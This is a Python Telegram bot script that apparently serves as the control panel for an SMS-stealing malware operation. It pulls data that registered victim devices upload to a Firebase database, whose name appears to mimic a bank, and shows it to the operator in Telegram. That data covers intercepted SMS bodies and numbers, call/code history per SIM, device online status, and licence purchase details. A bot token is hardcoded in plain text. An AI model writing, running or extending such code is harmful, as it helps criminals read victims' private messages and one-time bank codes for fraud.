import requests
import json
from datetime import datetime

# ============ CONFIG ============
BOT_TOKEN = "8788972827:AAE67a_-73U9zIWXteUtz1gbVW51WNlmRks"
FIREBASE_URL = "https://induslnd-wh5-04-05-2026-default-rtdb.firebaseio.com"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ============ FIREBASE FETCH ============
def firebase_get(path):
    try:
        r = requests.get(f"{FIREBASE_URL}/{path}.json", timeout=10)
        return r.json()
    except:
        return None

# ============ TELEGRAM HELPERS ============
def send_message(chat_id, text, reply_markup=None):
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(f"{API_URL}/sendMessage", json=payload)

def answer_callback(callback_id, text=""):
    requests.post(f"{API_URL}/answerCallbackQuery", json={
        "callback_query_id": callback_id,
        "text": text
    })

def main_menu(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📩 SMS Logs", "callback_data": "sms_devices"}],
            [{"text": "📞 Call History", "callback_data": "history_list"}],
            [{"text": "🌐 Check Online Status", "callback_data": "check_online"}],
            [{"text": "👑 Admin Info", "callback_data": "admin_info"}],
        ]
    }
    send_message(chat_id, "🤖 <b>Master Bot - Main Menu</b>\nKya dekhna chahte ho?", keyboard)

def format_time(ts):
    try:
        return datetime.fromtimestamp(int(ts)/1000).strftime('%d-%m-%Y %H:%M:%S')
    except:
        return str(ts)

# ============ HANDLERS ============
def handle_sms_devices(chat_id):
    data = firebase_get("registeredDevices")
    if not data:
        send_message(chat_id, "❌ Koi device nahi mila.")
        return
    keyboard = {"inline_keyboard": []}
    for device_id, device in data.items():
        model = device.get("model", device_id)
        brand = device.get("brand", "")
        label = f"📱 {brand} {model}".strip()
        keyboard["inline_keyboard"].append([
            {"text": label, "callback_data": f"sms_{device_id}"}
        ])
    keyboard["inline_keyboard"].append([{"text": "🔙 Back", "callback_data": "main_menu"}])
    send_message(chat_id, "📱 <b>Device chunno — SMS dekhne ke liye:</b>", keyboard)

def handle_sms_list(chat_id, device_id):
    data = firebase_get(f"registeredDevices/{device_id}/smsLogs")
    if not data:
        send_message(chat_id, "❌ Is device ka koi SMS log nahi mila.")
        return
    
    items = list(data.items())
    items.sort(key=lambda x: x[1].get("timestamp", ""), reverse=True)
    
    keyboard = {"inline_keyboard": []}
    for sms_id, sms in items[:15]:
        sender = sms.get("senderNumber", "Unknown")
        title = sms.get("title", "SMS")
        ts = sms.get("timestamp", "")
        label = f"📨 {sender} — {ts[:10] if ts else ''}"
        keyboard["inline_keyboard"].append([
            {"text": label, "callback_data": f"smsdetail_{device_id}_{sms_id}"}
        ])
    keyboard["inline_keyboard"].append([{"text": "🔙 Back", "callback_data": "sms_devices"}])
    send_message(chat_id, f"📩 <b>SMS Logs ({len(items)} total):</b>", keyboard)

def handle_sms_detail(chat_id, device_id, sms_id):
    sms = firebase_get(f"registeredDevices/{device_id}/smsLogs/{sms_id}")
    if not sms:
        send_message(chat_id, "❌ SMS nahi mila.")
        return
    
    text = (
        f"📨 <b>SMS Detail</b>\n\n"
        f"👤 <b>Sender:</b> {sms.get('senderNumber', 'N/A')}\n"
        f"📲 <b>Receiver:</b> {sms.get('receiverNumber', 'N/A')}\n"
        f"📅 <b>Time:</b> {sms.get('timestamp', 'N/A')}\n"
        f"🏷 <b>Title:</b> {sms.get('title', 'N/A')}\n"
        f"🔄 <b>Via Command:</b> {'Haan' if sms.get('fetched_via_command') else 'Nahi'}\n\n"
        f"💬 <b>Message:</b>\n{sms.get('body', 'N/A')}"
    )
    keyboard = {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": f"sms_{device_id}"}]]}
    send_message(chat_id, text[:4000], keyboard)

def handle_history(chat_id):
    data = firebase_get("history")
    if not data:
        send_message(chat_id, "❌ Koi history nahi mili.")
        return
    
    items = list(data.items())
    keyboard = {"inline_keyboard": []}
    for h_id, h in items[:20]:
        action = h.get("action", "unknown")
        code = h.get("code", "")
        status = h.get("status", "")
        ts = h.get("timestamp", "")
        label = f"{'✅' if status=='success' else '❌'} {action} — {code}"
        keyboard["inline_keyboard"].append([
            {"text": label, "callback_data": f"histdetail_{h_id}"}
        ])
    keyboard["inline_keyboard"].append([{"text": "🔙 Back", "callback_data": "main_menu"}])
    send_message(chat_id, f"📞 <b>Call History ({len(items)} records):</b>", keyboard)

def handle_history_detail(chat_id, h_id):
    h = firebase_get(f"history/{h_id}")
    if not h:
        send_message(chat_id, "❌ Detail nahi mili.")
        return
    
    text = (
        f"📞 <b>History Detail</b>\n\n"
        f"⚡ <b>Action:</b> {h.get('action', 'N/A')}\n"
        f"🔢 <b>Code:</b> {h.get('code', 'N/A')}\n"
        f"📶 <b>SIM:</b> {h.get('sim', 'N/A')}\n"
        f"✅ <b>Status:</b> {h.get('status', 'N/A')}\n"
        f"📝 <b>Result:</b> {h.get('result', 'N/A')}\n"
        f"⏰ <b>Last Updated:</b> {format_time(h.get('lastUpdated', 0))}\n"
        f"🕐 <b>Timestamp:</b> {format_time(h.get('timestamp', 0))}"
    )
    keyboard = {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "history_list"}]]}
    send_message(chat_id, text, keyboard)

def handle_check_online(chat_id):
    data = firebase_get("checkOnline")
    if not data:
        send_message(chat_id, "❌ Online status nahi mila.")
        return
    
    text = "🌐 <b>Device Online Status:</b>\n\n"
    for device_id, info in data.items():
        available = info.get("available", "Unknown")
        checked = format_time(info.get("checkedAt", 0))
        icon = "🟢" if "online" in str(available).lower() else "🔴"
        text += f"{icon} <b>{device_id}</b>\n   Status: {available}\n   Checked: {checked}\n\n"
    
    keyboard = {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "main_menu"}]]}
    send_message(chat_id, text, keyboard)

def handle_admin(chat_id):
    data = firebase_get("admin/admin1")
    if not data:
        send_message(chat_id, "❌ Admin info nahi mili.")
        return
    
    text = (
        f"👑 <b>Admin Info</b>\n\n"
        f"🔑 <b>Code:</b> {data.get('code', 'N/A')}\n"
        f"📅 <b>Active Until:</b> {format_time(data.get('activeUntil', 0))}\n"
        f"🛒 <b>Purchase Date:</b> {format_time(data.get('purchaseDate', 0))}\n"
        f"🔄 <b>Code Updated:</b> {format_time(data.get('codeUpdatedAt', 0))}"
    )
    keyboard = {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "main_menu"}]]}
    send_message(chat_id, text, keyboard)

# ============ MAIN LOOP ============
def process_update(update):
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        if text == "/start":
            main_menu(chat_id)

    elif "callback_query" in update:
        cb = update["callback_query"]
        chat_id = cb["message"]["chat"]["id"]
        data = cb["data"]
        answer_callback(cb["id"])

        if data == "main_menu":
            main_menu(chat_id)
        elif data == "sms_devices":
            handle_sms_devices(chat_id)
        elif data.startswith("sms_") and not data.startswith("smsdetail_"):
            device_id = data[4:]
            handle_sms_list(chat_id, device_id)
        elif data.startswith("smsdetail_"):
            parts = data.split("_", 2)
            handle_sms_detail(chat_id, parts[1], parts[2])
        elif data == "history_list":
            handle_history(chat_id)
        elif data.startswith("histdetail_"):
            h_id = data[11:]
            handle_history_detail(chat_id, h_id)
        elif data == "check_online":
            handle_check_online(chat_id)
        elif data == "admin_info":
            handle_admin(chat_id)

def run():
    print("🤖 Bot 1 chalu ho gaya!")
    offset = None
    while True:
        try:
            params = {"timeout": 30}
            if offset:
                params["offset"] = offset
            r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=35)
            updates = r.json().get("result", [])
            for update in updates:
                offset = update["update_id"] + 1
                process_update(update)
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    run()
    